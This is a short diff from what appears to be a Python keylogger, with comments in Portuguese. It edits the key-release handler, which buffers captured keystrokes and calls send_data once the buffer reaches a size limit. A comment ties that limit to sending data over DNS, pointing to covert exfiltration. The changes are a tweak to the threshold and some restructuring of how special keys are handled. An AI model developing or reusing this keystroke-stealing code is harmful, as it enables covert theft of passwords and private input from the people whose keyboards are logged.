@@ -80,7 +80,7 @@ def on_release(key):
     global _KEYS
 
     # Só envio quando bater o tamanho máximo de envio por DNS
-    if len(_KEYS) >= 30:
+    if len(_KEYS) >= 31:
         send_data(_KEYS)
         _KEYS = []
 
@@ -109,6 +109,10 @@ def on_release(key):
         elif key == key.backspace:
             _KEYS = _KEYS[:-1]
 
+        else:
+            print(key)
+
+        '''
         elif key == key.num_lock:
             _KEYS.append('ß')
 
@@ -123,13 +127,8 @@ def on_release(key):
 
         elif key == key.shift or key.shift_l:
             _KEYS.append('Þ')
-    
-    # O TECLADO NUMERO ESTÁ RETORNANDO NONE, TENHO QUE CONFERIR OQUE ESTÁ ACONTECENDO
-        # if key == None:
-        #     _KEYS.append('¿')
-            
-        else:
-            print(key)
+        '''            
+        
 
 ###############################################################
 # Main
